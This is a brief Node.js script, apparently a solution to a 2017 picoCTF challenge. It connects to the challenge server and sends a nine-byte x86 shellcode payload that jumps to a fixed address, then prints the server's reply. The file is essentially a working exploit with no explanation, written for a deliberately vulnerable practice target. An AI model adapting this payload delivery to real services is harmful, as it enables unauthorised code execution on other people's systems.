var client = new require('net').Socket();

client.connect(55049, 'shell2017.picoctf.com', function() 
{
	client.write(Buffer.from([0x33, 0xC0, 0x05, 0x40, 0x85, 0x04, 0x08, 0xFF, 0xE0]));
});

client.on('data', function(data) 
{
	console.log(data.toString());
});

client.on("error", function(err)
{
	console.log ("exception: " + err);
})

client.on('close', function() 
{
	console.log('Disconnected from the server.');
});